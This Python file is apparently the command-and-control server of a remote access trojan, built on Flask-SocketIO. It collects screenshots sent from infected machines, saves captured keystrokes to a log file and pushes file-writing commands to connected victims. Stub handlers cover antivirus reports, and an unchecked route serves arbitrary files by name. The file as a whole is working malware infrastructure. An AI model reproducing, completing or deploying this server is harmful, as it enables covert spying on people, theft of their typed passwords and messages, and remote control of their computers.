from flask import Flask, request
from flask_socketio import SocketIO, send, join_room, leave_room, rooms, disconnect
import json
from PIL import Image
import socketio


app = Flask(__name__)
app.config['SECRET_KEY'] = 'topsecret'
sio = SocketIO(app)


    
    

    


@sio.on('connect')
def handle_connect():
    print(f"my SID is {request.sid}")
    get_command()
   

@sio.on('sc_snap')
def get_snaps(img_data):
    print("fn start")
    
    img = Image.frombytes(img_data['mode'], img_data['size'], img_data['image_data'])
    print(img)
    img.show()
    print("fn end")
    
@sio.on('key_recorder')
def get_keylogs(recorder):
    print("keys received")
    with open('keylogs.txt', "a+") as kl:
        kl.write(recorder['data'])
    print(f'Key recorded received: {recorder["data"]}')
    
@sio.on('response')
def gey_keylogs(user):
    pass
    

@sio.on('antiviruses')
def get_antiviruses(room):
    pass


@sio.on('disconnect')
def handle_disconnected_user():
    pass
    
@app.route('/static/downloads/<file>')
def give_info(file):
    with open(file, "r+") as f:
        data = f.read()
    return data

def get_command():
    print(f'Start of get_command')
    #comm_num = input("select command from these:\n(1)write a file from /static/downloads into computer\n(2)send file name and file contents to write in computer\n(3)make a remeote request from computer(NOT WORKING)\nselected option: ")
    comm_num = 2
    if int(comm_num) == 2: 
        print(f'Receive {comm_num}')
        #comm_data = input("enter file name you wish to copy: ")
        comm_data = 'test4.txt'
        sio.emit('action', {'action_number': int(comm_num), 'file': comm_data, 'file_data': b'this is a test'}) 
        print("action sent")

if __name__ == '__main__':
    print(f'Server CC starting main')
    sio.run(app, debug=True, log_output=False)
     
